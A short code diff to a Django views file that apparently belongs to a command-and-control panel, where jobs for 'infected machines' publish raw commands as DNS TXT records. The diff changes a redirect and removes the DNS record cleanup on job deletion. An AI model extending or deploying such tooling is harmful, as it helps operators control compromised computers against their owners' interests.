@@ -95,15 +95,12 @@ def job_create(request: HttpRequest, machine_id: int):
 
     DnsService().set_job_txt(machine, raw_command).apply()
 
-    return redirect('machines')
+    return redirect(f'/jobs?machine_id={machine_id}')
 
 @require_POST
 def job_delete(_: HttpRequest, job_id: int):
     job = Job.objects.filter(id=job_id).first()
-    if job is not None:
-        from djangoproject.services.DnsService import DnsService
-        DnsService().remove_job_txt(job.infected_machine)
-        job.delete()
+    if job is not None: job.delete()
 
     return redirect('jobs')
 
